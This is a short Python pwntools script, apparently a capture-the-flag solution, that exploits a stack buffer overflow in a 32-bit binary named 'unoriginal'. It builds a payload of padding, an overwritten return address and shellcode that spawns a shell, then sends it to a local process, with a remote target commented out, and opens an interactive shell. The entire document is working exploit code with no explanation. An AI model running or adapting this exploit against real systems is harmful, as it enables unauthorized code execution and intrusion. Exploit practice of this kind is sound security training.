from pwn import *
sh = asm(shellcraft.i386.linux.sh())
payload = "A"*0xd + "BBBB" + p32(0x8048350) + sh
payload = "A"*17 + p32(0x8048350) + sh
with open('in','wb') as f: f.write(payload)
p = process('./unoriginal')
H,P='localhost',6666
#p = remote(H,P)
p.send(payload)
p.interactive()
